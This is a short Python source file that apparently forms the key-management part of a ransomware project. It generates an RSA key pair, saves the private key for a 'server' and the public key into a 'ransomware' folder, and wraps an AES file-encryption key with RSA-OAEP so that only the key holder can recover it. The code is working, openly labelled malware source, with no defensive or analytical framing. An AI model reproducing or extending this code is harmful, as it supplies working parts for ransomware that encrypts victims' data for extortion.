from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

def generate_keys():
    key = RSA.generate(2048) # Generate a new 2048-bit RSA key pair
    private_key = key.export_key() # Export private key as bytes
    public_key = key.public_key().export_key() # Export the corresponding public key as bytes
    with open("server/keys/private.pem", 'wb') as priv:
        priv.write(private_key)
    with open("ransomware/keys/public.pem", 'wb') as pub:
        pub.write(public_key)

def encrypt_key(aes_key, public_key):
    recipient_key = RSA.import_key(public_key) # Load the public ket from bytes
    cipher_rsa = PKCS1_OAEP.new(recipient_key) # Create an RSA cipher using OAEP padding
    encrypt_key = cipher_rsa.encrypt(aes_key) # Encrypth the AES key
    return base64.b64encode(encrypt_key) # Encode the result as base64 for safe storage
